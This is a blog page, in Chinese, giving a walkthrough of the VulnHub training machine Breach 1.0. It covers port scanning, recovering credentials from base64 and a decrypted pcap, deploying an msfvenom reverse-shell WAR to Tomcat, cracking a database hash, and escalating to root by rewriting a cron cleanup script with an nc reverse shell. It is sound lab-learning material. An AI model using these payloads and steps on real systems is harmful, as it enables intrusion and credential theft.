@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8"/>
+    <meta name="viewport" content="initial-scale=1.0, width=device-width"/>
+    <title>
+      
+        Breach 1.0 | Blanks'Blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/apple-touch-icon.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/favicon-32x32.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/favicon-16x16.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/logo.svg"
+            color=""/>
+    
+    
+    
+      
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/regular.ttf);
+        font-weight: regular;
+    }
+  </style>
+
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/bold.ttf);
+        font-weight: bold;
+    }
+  </style>
+
+
+    
+    <link rel="stylesheet"
+          type="text/css"
+          href='/css/layout.css'/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css" />
+  
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href='/' class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/logo.svg"/>
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AD%A6%E4%B9%A0">Notes</a>
+            
+          
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner--toc">
+      <div class="post-content__head">
+        <div class="post-title">Breach 1.0</div>
+        <div class="post-info">
+          
+  <a href="/tags/vulnhub/" class="post-tag">#vulnhub</a>
+
+
+          <span class="post-date">2023-03-19</span>
+        </div>
+      </div>
+      
+        <aside class="toc-outer">
+          <div class="toc-title">目录</div>
+          <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">base64解码</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">使用信息收集的base64解密登录CMS</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">Wireshark抓包</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">第二个密码</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">Burp</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">上传.war 包</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">msf反弹shell &gt;&gt;&gt;提权</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">提权成功</span></a></li></ol>
+          <a href="#" class="toc-top">回到顶部</a>
+        </aside>
+      
+      <div class="post-content__body">
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <meta name="referrer" content="no-referrer">
+
+
+
+<p>Breach 靶机固定IP <br>192.168.110.140<br><a name="JmpV8"></a></p>
+<h1><span id="信息收集">信息收集</span></h1><p>namp 扫一下开了几个端口<br>nmap -sV -A -v 192.168.110.140<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642657506849-44f0206d-c6d1-4d80-8f46-3115102b1324.png#clientId=u546a1c63-f0a9-4&from=paste&height=59&id=u14b7c271&name=image.png&originHeight=117&originWidth=754&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19484&status=done&style=none&taskId=u3104d71c-5062-4e50-9a13-d34f45c0bd0&title=&width=377" alt="image.png"><br>有一千多多个端口 开放 这很有可能迷惑 所使用的</p>
+<p>这里就只要浏览器访问他的80端口网页试一下<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642657648864-f4fcc952-77ff-47db-8576-fafd6efa7987.png#clientId=u546a1c63-f0a9-4&from=paste&height=446&id=u7e0f15e1&name=image.png&originHeight=892&originWidth=1893&originalType=binary&ratio=1&rotation=0&showTitle=false&size=889944&status=done&style=none&taskId=u88225bc6-574a-483b-a713-94629653395&title=&width=946.5" alt="image.png"><br>给了一个这样的一个页面 ，我们要去找一些相关的信息 <br>F12 看一下它的代码<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642657731556-1d13a11c-4891-4999-8e2a-b598da1787dd.png#clientId=u546a1c63-f0a9-4&from=paste&height=182&id=u1544b26f&name=image.png&originHeight=363&originWidth=780&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22625&status=done&style=none&taskId=u55229739-05f8-4649-90b0-be8217396e8&title=&width=390" alt="image.png"><br><a name="sv7qI"></a></p>
+<h2><span id="base64解码">base64解码</span></h2><p>这里看出一一个base64 码 <br>我们这里使用python 解一下码 是一个二次加密的base64<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642657944935-502c3140-f56c-433a-9308-bac3e9fc7eec.png#clientId=u546a1c63-f0a9-4&from=paste&height=133&id=uff24d627&name=image.png&originHeight=266&originWidth=757&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36128&status=done&style=none&taskId=u42b044b5-6faa-4b4d-9dbe-0f985f5b234&title=&width=378.5" alt="image.png"><br>这像一个账号密码的 不管了先收集一下<br><strong>pgibbons:damnitfeel$goodtobeagang$ta</strong><br><strong>然后继续观察网页发现一个超链接 点进去观察</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642658736176-617d54a7-1d27-4c7e-92e7-f99e8a287f36.png#clientId=u546a1c63-f0a9-4&from=paste&height=446&id=ueff8b69d&name=image.png&originHeight=891&originWidth=1448&originalType=binary&ratio=1&rotation=0&showTitle=false&size=160244&status=done&style=none&taskId=u0caf0b54-6d01-4abf-bac5-18aaca50d31&title=&width=724" alt="image.png"><br>发现 是一个 佩内特罗德赛博咨询有限责任公司 的什么网页 ？？？？<br>点击   <a target="_blank" rel="noopener" href="http://192.168.110.140/impresscms/user.php">Employee portal</a>   就弹出一个cms 的网页<br><a name="CM3XH"></a></p>
+<h2><span id="使用信息收集的base64解密登录cms">使用信息收集的base64解密登录CMS</span></h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642658883556-0fb58eea-bc9a-4564-ac4b-9a1f7263305e.png#clientId=u546a1c63-f0a9-4&from=paste&height=397&id=ufeeab64e&name=image.png&originHeight=794&originWidth=1413&originalType=binary&ratio=1&rotation=0&showTitle=false&size=149433&status=done&style=none&taskId=ue5279711-9e2c-45bf-8cb9-6bf84f8546c&title=&width=706.5" alt="image.png"><br>需要账号密码 ？？想到了刚才的base64 解密之后就是一个 账号密码了<br>看能 不能登上去看看<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642659011079-810ff05c-9f69-4a0b-ae18-9575d6899f1f.png#clientId=u546a1c63-f0a9-4&from=paste&height=342&id=u16d309ba&name=image.png&originHeight=684&originWidth=1265&originalType=binary&ratio=1&rotation=0&showTitle=false&size=128934&status=done&style=none&taskId=u2b0841d7-80e0-40ed-bd40-5f3d54c8c2c&title=&width=632.5" alt="image.png"><br>成功登上后台<br>看左边 发现三个红点好像是邮箱 ，不会是什么秘密把<br>前两个没有什么用说的是安全什么的 <br>看最后一个 有两个线索点<br> 一个是 在 <a target="_blank" rel="noopener" href="http://192.168.110.140/.keystore">http://192.168.110.140/.keystore</a> 保存了一个东西<br>另外一个是让找到一个新的SSL 证书 <br>下载包含SSL证书的密钥库keystore文件(keystore是存储公私密钥的一种文件格式)<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642659268863-55472820-29be-401d-818f-47d9ec11f229.png#clientId=u546a1c63-f0a9-4&from=paste&height=201&id=uc62a576e&name=image.png&originHeight=401&originWidth=993&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49589&status=done&style=none&taskId=u43d0f4bf-54bd-4a3a-824b-e89a4380c08&title=&width=496.5" alt="image.png"><br>点击View Account菜单进入界面，再依次点击页面的Content，会弹出一行链接Content SSL implementation test capture<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642662067038-adae2c93-150b-48b0-800b-9e883f6d6f0b.png#clientId=u546a1c63-f0a9-4&from=paste&height=188&id=uacf9696c&name=image.png&originHeight=375&originWidth=918&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55038&status=done&style=none&taskId=ua59cb7e1-c821-4758-a691-f2d7034b9aa&title=&width=459" alt="image.png"><br>介绍<br>我已经上传了我们红队重新制作的攻击的pcap文件。我不确定他们使用了什么诡计，但我无法读取文件。我尝试了C|EH研究中的每一个nmap开关，只是无法弄清楚。** **<a target="_blank" rel="noopener" href="http://192.168.110.140/impresscms/_SSL_test_phase1.pcap">http://192.168.110.140/impresscms/_SSL_test_phase1.pcap</a>他们告诉我别名，存储密码和密钥密码都设置为”tomcat”。这有用吗？有谁知道这是什么？我想我们现在被安全加密了吗？-彼得·皮尔斯我将在接下来的2天内钓鱼，无法访问电子邮件或电话。<br>有发现了papc文件    已经告诉了密码都是tomcat </p>
+<p>从密钥库导出.p12证书，将keystore拷贝到D盘目录，导出名为：tomcatkeystore.p12的证书<br> keytool -importkeystore -srckeystore .\keystore -destkeystore d:\tomcatkeystore.p12 -deststoretype PKCS12 -srcalias tomcat<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642662250319-a1635f19-6712-4224-88a1-ec492d77fd07.png#clientId=u546a1c63-f0a9-4&from=paste&height=274&id=u9f3dc1c1&name=image.png&originHeight=547&originWidth=1447&originalType=binary&ratio=1&rotation=0&showTitle=false&size=211988&status=done&style=none&taskId=u21a36fee-62f2-4c2f-8bd4-bffc0c3f7c0&title=&width=723.5" alt="image.png"><br><a name="Afc0i"></a></p>
+<h1><span id="wireshark抓包">Wireshark抓包</span></h1><p>将证书导入Wireshark</p>
+<p> <img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642662457231-31cda02d-6adc-4db0-bf6f-d70cc1a0d7bc.png#clientId=u546a1c63-f0a9-4&from=paste&height=385&id=u0b12848c&name=image.png&originHeight=769&originWidth=1080&originalType=binary&ratio=1&rotation=0&showTitle=false&size=125225&status=done&style=none&taskId=ue734c20f-c42e-46b1-af11-5367dd35bf4&title=&width=540" alt="image.png"><br>过滤http<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642663814061-a2690648-5538-4195-b903-6a6a7f5bfccd.png#clientId=u546a1c63-f0a9-4&from=paste&height=523&id=uc5f1b2bc&name=image.png&originHeight=1046&originWidth=1510&originalType=binary&ratio=1&rotation=0&showTitle=false&size=167214&status=done&style=none&taskId=ua9b57368-afb5-4e9f-bb10-a63dec4b13b&title=&width=755" alt="image.png"><br>  http追踪流 找到一串 base64 <br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642664075107-f8ed1de5-1d4e-4e66-8333-0e7da55b0bd4.png#clientId=u546a1c63-f0a9-4&from=paste&height=349&id=ua943aaa5&name=image.png&originHeight=697&originWidth=847&originalType=binary&ratio=1&rotation=0&showTitle=false&size=89521&status=done&style=none&taskId=u4990cd48-919c-4f50-98df-16619fe3725&title=&width=423.5" alt="image.png"><br><a name="mpciA"></a></p>
+<h3><span id="第二个密码">第二个密码</span></h3><p>解密<br>tomcat:Tt\5D8F(#!*u&#x3D;G)4m7zB <br>好像又是一个账号密码<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642664153056-6c302054-5136-4463-8225-285cd20e3b4b.png#clientId=u546a1c63-f0a9-4&from=paste&height=268&id=ua6cb49c6&name=image.png&originHeight=536&originWidth=970&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28151&status=done&style=none&taskId=u35267bd6-87ea-4146-a3e2-04055a031a3&title=&width=485" alt="image.png"></p>
+<p>找到一个网站 但是打不开发不了数据 我们这里使用bp<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642664302458-159a461d-24da-4fb2-97b2-8af659c9990f.png#clientId=u546a1c63-f0a9-4&from=paste&height=289&id=u311946e4&name=image.png&originHeight=578&originWidth=1059&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32725&status=done&style=none&taskId=u75f207f4-e869-457b-825d-3e92fc95ce0&title=&width=529.5" alt="image.png"><br><a name="PK9Qz"></a></p>
+<h1><span id="burp">Burp</span></h1><p>成功访问<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642664997211-aeb62a47-04b7-4359-8a09-01a561f3c158.png#clientId=u546a1c63-f0a9-4&from=paste&height=479&id=u189ae595&name=image.png&originHeight=958&originWidth=1479&originalType=binary&ratio=1&rotation=0&showTitle=false&size=98278&status=done&style=none&taskId=uad6d0d53-9c54-41cf-8dc3-ac45a2cabe3&title=&width=739.5" alt="image.png"><br><a name="n7IFq"></a></p>
+<h2><span id="上传war-包">上传.war 包</span></h2><p>登入<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642665082663-58fc8916-928e-4dd8-bb7f-46707a5a7d82.png#clientId=u546a1c63-f0a9-4&from=paste&height=535&id=uedbc6ec9&name=image.png&originHeight=1070&originWidth=1924&originalType=binary&ratio=1&rotation=0&showTitle=false&size=185720&status=done&style=none&taskId=u99a12ab8-0098-4271-bea9-592e0f8522c&title=&width=962" alt="image.png">Tomcat后台getshell<br>这里需要上传.war 包<br>msfvenom -p java&#x2F;jsp_shell_reverse_tcp lhost&#x3D;192.168.110.128 lport&#x3D;8989 -f war -o exp.war   <br>  <br>Payload size: 1092 bytes<br>Final size of war file: 1092 bytes<br>Saved as: exp.war</p>
+<p>use exploit&#x2F;multi&#x2F;handler </p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642667283961-553956ac-543e-4819-9c07-6a6198eef0ea.png#clientId=u546a1c63-f0a9-4&from=paste&height=97&id=u9574903c&name=image.png&originHeight=193&originWidth=712&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17838&status=done&style=none&taskId=u0a80ef51-a865-47b8-b917-dde5ff77c76&title=&width=356" alt="image.png"><br>上传<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642667352917-18b81f50-6c71-4951-a526-878387d2deec.png#clientId=u546a1c63-f0a9-4&from=paste&height=462&id=u66ad2ac5&name=image.png&originHeight=924&originWidth=1142&originalType=binary&ratio=1&rotation=0&showTitle=false&size=89540&status=done&style=none&taskId=u5d39b594-a416-4d5a-963a-7acf1e074a6&title=&width=571" alt="image.png"><br>访问<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642667371293-8f218334-485e-45b6-a8be-fe42771fc506.png#clientId=u546a1c63-f0a9-4&from=paste&height=270&id=u622f49c9&name=image.png&originHeight=540&originWidth=1066&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18521&status=done&style=none&taskId=ud72db8a5-7eab-4f42-8c33-b82aad5703f&title=&width=533" alt="image.png"></p>
+<p><a name="Fq6P8"></a></p>
+<h1><span id="msf反弹shell-gtgtgt提权">msf反弹shell &gt;&gt;&gt;提权</span></h1><p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642667441985-4486ef82-4399-4b5a-b91c-63a3b215c716.png#clientId=u546a1c63-f0a9-4&from=paste&height=137&id=u371108f0&name=image.png&originHeight=273&originWidth=1089&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20964&status=done&style=none&taskId=uf08311e3-b67c-49ba-ac50-80de9d05818&title=&width=544.5" alt="image.png"><br>反弹成功后，输入命令python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’得到bash模式，<br>最后得到shell,并尝试登录mysql<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642667574179-2e629a6d-20bb-424e-af79-69aa82d1270b.png#clientId=u546a1c63-f0a9-4&from=paste&height=80&id=u08a8783f&name=image.png&originHeight=160&originWidth=651&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13792&status=done&style=none&taskId=u8725fd27-30ab-41b3-89b0-97fd750d61a&title=&width=325.5" alt="image.png"></p>
+<p>查找数据库<br>show databases;<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642668429568-7dd863dd-e08f-482d-9fc2-4c4d6b05c7ea.png#clientId=u546a1c63-f0a9-4&from=paste&height=126&id=u42180b7e&name=image.png&originHeight=251&originWidth=323&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9419&status=done&style=none&taskId=u702e769b-3f7a-4ed5-b85f-382a0f80946&title=&width=161.5" alt="image.png"><br>use mysql ;<br>查看所有表<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642668641026-e8c3cea0-37b1-44ff-8c73-6cdf58f2114a.png#clientId=u546a1c63-f0a9-4&from=paste&height=291&id=udc78b24d&name=image.png&originHeight=581&originWidth=269&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20639&status=done&style=none&taskId=u39c2968a-050f-4f82-9896-a7576fcae58&title=&width=134.5" alt="image.png"><br>找到用户 表 密码<br>转一下md5<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642668695589-f34d959d-f913-44f6-9c9a-dcc6971e7833.png#clientId=u546a1c63-f0a9-4&from=paste&height=143&id=ua13a3cac&name=image.png&originHeight=285&originWidth=695&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18750&status=done&style=none&taskId=u4bfc1e34-66bf-4abc-baf1-617a5e8b308&title=&width=347.5" alt="image.png"><br>解码<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642668821300-1fd2ad80-7ac6-4596-a097-1dd465f54562.png#clientId=u546a1c63-f0a9-4&from=paste&height=150&id=u15d20016&name=image.png&originHeight=299&originWidth=1055&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22884&status=done&style=none&taskId=uadd26d00-50e3-4d9b-a742-15fa8a3734a&title=&width=527.5" alt="image.png"><br>密码： thelaststraw<br>登录<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642668925824-e6267d72-a9c4-44bc-92fb-6483e3c37e0e.png#clientId=u546a1c63-f0a9-4&from=paste&height=63&id=u59b0079a&name=image.png&originHeight=125&originWidth=595&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8383&status=done&style=none&taskId=u867052da-a0e2-44f9-92b6-720b5d4314c&title=&width=297.5" alt="image.png"><br>看到历史命令su提权到了blumbergh用户。<br>需要找到blumbergh用户的密码。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642669017101-3db4bb2d-24d1-4c66-bb06-771a181e62d8.png#clientId=u546a1c63-f0a9-4&from=paste&height=310&id=u6b41b5b5&name=image.png&originHeight=620&originWidth=530&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28735&status=done&style=none&taskId=uec4efd57-8bb7-41be-8b81-4fa642fca9d&title=&width=265" alt="image.png"><br>得到六张图片<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642669118747-5e51e55b-8fbf-4a75-8db9-080128c63a11.png#clientId=u546a1c63-f0a9-4&from=paste&height=268&id=u418f7399&name=image.png&originHeight=535&originWidth=980&originalType=binary&ratio=1&rotation=0&showTitle=false&size=66339&status=done&style=none&taskId=u0f2350d8-04e6-4bbc-a7b2-748590c3f56&title=&width=490" alt="image.png"><br>第一张图片 <br>查看字符串信息<br>有两个很像密码试一下<br>strings bill.png<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642669370467-6fc18e6a-ec2a-4d25-882f-c8b536651635.png#clientId=u546a1c63-f0a9-4&from=paste&height=278&id=u37f65bd8&name=image.png&originHeight=561&originWidth=252&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22676&status=done&style=none&taskId=u2e859152-d2f4-4caf-906f-8b79e0146a4&title=&width=125" alt="image.png"><br>登录试一下<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642669502706-84e861d4-b798-4b90-aa3c-5f1eb6fd00bf.png#clientId=u546a1c63-f0a9-4&from=paste&height=144&id=u2fa9cabb&name=image.png&originHeight=287&originWidth=652&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26563&status=done&style=none&taskId=u6212878d-f443-4607-aa28-551faa5716f&title=&width=326" alt="image.png"><br>成功登录<br>历史记录<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642669627379-b9ab31b0-f330-40fb-a366-5897a28bfac9.png#clientId=u546a1c63-f0a9-4&from=paste&height=123&id=u814f61ab&name=image.png&originHeight=246&originWidth=402&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10296&status=done&style=none&taskId=uf9591fcc-281d-48e3-8b7d-f25949a0d87&title=&width=201" alt="image.png"><br>找到tidyup.sh<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642670307013-02c53904-97dd-4ba8-a31a-f3d8e54d000f.png#clientId=u546a1c63-f0a9-4&from=paste&height=141&id=ub2db5301&name=image.png&originHeight=282&originWidth=925&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27737&status=done&style=none&taskId=u5a3bc364-52de-4d83-a880-7f7a49b9bc5&title=&width=462.5" alt="image.png"><br>这是一段清理脚本，描述中说明每3分钟执行清理，删除webapps目录下的文件，因此之前上传的 马 总是被删除，需要重新上传。查看tidyup.sh的权限，对该脚本没有写入权限，只有root可以</p>
+<p>tidyup.sh文件只有root可写，而能够以root权限运行tee命令，那么用tee命令写tidyup.sh：先将反弹shell命令写入shell.txt文件,nc反弹命<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642670883827-33a3728d-e2ee-4868-a452-6c382e621e9a.png#clientId=u546a1c63-f0a9-4&from=paste&height=95&id=u38063d0d&name=image.png&originHeight=190&originWidth=916&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26328&status=done&style=none&taskId=uc46e917e-f695-4bc2-8362-831964e67fd&title=&width=458" alt="image.png"><br>nc监听<br><a name="cS73b"></a></p>
+<h1><span id="提权成功">提权成功</span></h1><p><img src="https://cdn.nlark.com/yuque/0/2022/png/22356351/1642670977333-08a44ffe-2119-4fff-b4eb-5a8a7dab9e91.png#clientId=u546a1c63-f0a9-4&from=paste&height=103&id=u24019caf&name=image.png&originHeight=205&originWidth=686&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12687&status=done&style=none&taskId=ue63b54b4-9269-4cbc-abe0-c8a38110849&title=&width=343" alt="image.png"></p>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/03/19/CLOUD%20AV/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>Cloud AV</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/03/19/Hard_socnet2/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      Hard_socnet2
+    </a>
+  
+</div>
+
+    
+      <div class="related-post">
+  <div class="related__head">
+  <a href="/tags/vulnhub/" class="post-tag">#vulnhub</a>
+
+</div>
+  <div class="realated__body">
+    
+      DEBUG: 请安装插件 <a target="_blank" rel="noopener" href="https://github.com/tea3/hexo-related-popular-posts">hexo-related-popular-posts</a> 或关闭 related_post 配置!
+    
+  </div>
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              
+                <div class="matts">浮</div>
+              
+                <div class="matts">云</div>
+              
+                <div class="matts">游</div>
+              
+                <div class="matts">子</div>
+              
+                <div class="matts">意</div>
+              
+            </div>
+          
+            <div class="foot-line">
+              
+                <div class="matts">落</div>
+              
+                <div class="matts">日</div>
+              
+                <div class="matts">故</div>
+              
+                <div class="matts">人</div>
+              
+                <div class="matts">情</div>
+              
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/x0blank">github</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link" height="20px" width="20px" src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:chenxiaolong592@gmail.com">chenxiaolong592@gmail.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="http://example.com">Blanks'Blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)" d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z"/>
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)" d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z"/>
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)" d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z"/>
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+    
+  
+
+  </body>
+</html>
